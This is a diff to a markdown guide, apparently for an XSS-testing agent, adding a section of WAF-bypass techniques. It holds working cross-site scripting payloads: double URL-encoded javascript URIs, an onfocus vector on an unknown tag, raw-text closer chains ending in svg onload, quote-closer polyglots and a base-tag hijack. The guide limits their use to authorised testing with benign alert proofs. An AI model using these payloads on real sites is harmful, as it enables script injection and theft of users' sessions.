@@ -118,7 +118,10 @@ Escalate gradually. Keep the payload semantically tied to the classified context
 
 ### Advanced Polyglots
 
-Use only after you already know the context and need a harder bypass:
+Use only after you already know the context and need a harder bypass. See
+`agents/xss_bypasses/polyglot.py` (`POLYGLOT_PAYLOADS`) for the runnable bank
+these are drawn from — each entry there has a comment explaining exactly which
+parsing/filter assumption it breaks.
 
 ```text
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */alert(1))//
@@ -133,6 +136,36 @@ micho',%20x:self[String.fromCharCode(112,114,111,109,112,116)](document[String.f
 ```
 
 Use only on an owned/authorized target and prefer a benign proof such as `prompt` over data exfiltration. Record whether the WAF blocks the raw names, the character-code construction, the quote breakout, or the eventual browser execution.
+
+### Unorthodox / Kitchen-Sink Techniques
+
+These techniques target a specific parsing or filtering assumption rather than
+adding indiscriminate payload volume. Use them only after context-specific
+families are exhausted.
+
+- **Double URL-encoding** (`%250A` -> `%0A` -> newline) to survive a WAF or
+  proxy that decodes once: `javascript://%250Aalert?.(1)//`
+- **Attribute casting via an unknown tag** — `contentEditable`/`autoFocus`
+  can turn an otherwise unknown tag into a focusable target when a filter only
+  strips known-dangerous tag names:
+  `<k/contentEditable/autoFocus/OnFocus=alert(1)>`
+- **Raw-text closer chains** — close the applicable raw-text parsing context
+  (`title`/`style`/`script`/`textarea`/`iframe`/`noscript`) only after evidence
+  identifies it:
+  `</title></style></script></textarea></iframe></noscript><svg onload=alert(1)>`
+- **Quote/backtick/entity comment-closer chains** — cover quote variants only
+  when the injection point's quoting behavior is uncertain:
+
+  ```text
+  //'/*\'/*"/*\"/*`/*\`/*&apos;)/*<svg onload=alert(1)>
+  ```
+- **`<base>` hijack + trailing comment swallow** — affects relative resource
+  URLs and following markup; use only where `<base>` is actually accepted and
+  the authorized test plan permits the browser-side impact.
+
+These are noisy and need stronger browser confirmation than a context-matched
+probe. Record the parser/WAF transform and stop once the relevant boundary is
+understood.
 
 ## Framework-Specific Sinks And Bypasses
 
